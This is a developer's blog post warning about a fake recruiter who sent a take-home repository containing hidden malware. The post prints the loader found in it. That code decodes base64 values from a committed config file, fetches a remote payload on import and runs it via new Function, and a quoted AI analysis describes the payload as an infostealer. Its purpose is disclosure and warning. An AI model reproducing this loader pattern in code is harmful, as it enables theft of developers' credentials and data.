---
title: "When the recruiter is malware"
date: 2026-03-31
draft: false
---

Something a little strange happened to me today.

A recruiter contacted me on LinkedIn about a US Full Stack Developer role. I had nothing to lose, so I agreed and took a look at the company. It didn’t excite me much, but I thought: “why not use it as interview practice?”

Then I got the usual Calendly link, followed almost immediately by an email with a small project to review and discuss during the first interview.

⚠️ **Disclaimer: the screenshot below contains the repository link. Do not open it and do not run the code under any circumstances. It contains malware. I accept no responsibility for any damage that may result from it.**

![The fake recruiter email](/images/blog/2026-03-31-phishing-recruiter/email.png)

At first it felt a bit unusual. The first interview is usually just introductory, but I figured maybe they were a small team trying to move fast, so I didn’t think too much about it and planned to review the code before the call.

Today I opened the repo. It looked like a fairly standard setup: frontend, backend, and a small smart contract connected to it all. Nothing out of the ordinary.

I started by looking through the frontend structure to understand the basics: data flow, endpoints, and so on. Then I noticed something odd.

![config.env committed in the repo](/images/blog/2026-03-31-phishing-recruiter/config-env.png)

They had committed a `config.env` file to the repository. Strange, but still plausible — maybe they forgot.

I opened it and saw a few strings that looked suspicious. At a glance, they seemed to be base64-encoded.

So I went looking for wherever those environment variables were being loaded, but found nothing. No `config.ts`, no `loadEnv`, nothing obvious.

Still, those values had to be used somewhere.

So I searched for `process.env` and then — **hold on, absolutely not** — I found this:

```ts
// ================= GET COOKIE =================
export const getCookie = (async () => {
  try {
    const s = Buffer.from(process.env.DEV_API_KEY as string, "base64").toString();
    const k = Buffer.from(process.env.DEV_SECRET_KEY as string, "base64").toString();
    const v = Buffer.from(process.env.DEV_SECRET_VALUE as string, "base64").toString();

    const r = (
      await axios.get(s, {
        headers: { [k]: v },
      })
    ).data.cookie;

    const handler = new Function("require", r);
    handler(require);

  } catch (error: any) {}
})();
```

I immediately deleted everything. I know that wasn’t strictly necessary, but I’m paranoid.

Then I asked Claude (web) to analyze the remote repository for me so I could understand what was going on.

> The variables in `.config.env` (committed to the repo intentionally, not by accident) decode from base64 to:
>
> - `DEV_API_KEY` → `https://jsonkeeper.com/b/xxxx` (payload URL)
> - `DEV_SECRET_KEY` → `x-secret-key` (HTTP header)
> - `DEV_SECRET_VALUE` → `_` (header value)
>
> The `getCookie` function is an IIFE (it runs as soon as the module is imported). It sends a GET request to that URL, extracts the `.cookie` field from the response, and passes it to `new Function("require", r)` — essentially an `eval()` with full access to `require`, which means full access to Node.js: filesystem, processes, network, everything.
>
> The downloaded payload is a ~140KB blob of heavily obfuscated JavaScript: RC4 string encryption, flattened control flow implemented with a state-machine-style switch, and proxy objects wrapping function calls. Even through the obfuscation, several things are clearly visible:
>
> - use of `child_process` (`spawn` / `exec`) to run system commands
> - construction of IP addresses from split variables (likely for data exfiltration)
> - hooks on `process.on("uncaughtException")` and `"unhandledRejection"` to suppress visible crashes
> - enumeration of file paths and system information
> - the empty `catch` block in the wrapper to silence any errors
>
> In short: an **infostealer** that, on the first `npm run dev`, would have had full access to the machine — browser cookies, crypto wallets, SSH keys, cloud credentials, anything.

The interview call is supposed to happen tonight at 5pm. I obviously won’t join. But I’m curious to see whether they contact me again or, as I suspect, cancel shortly before the meeting.

I already have reports prepared for both LinkedIn and GitHub to get the accounts taken down.

This time I got dangerously close.

Normally I would just run `npm run dev` right away to see the frontend as quickly as possible. If I had done that this time, I would have much bigger problems now.

I’m a little proud that I didn’t fall for it, but I also know it was mostly luck.

Those of us who work in tech often like to think we’re immune to phishing. For me, this was a useful reminder that we’re not.
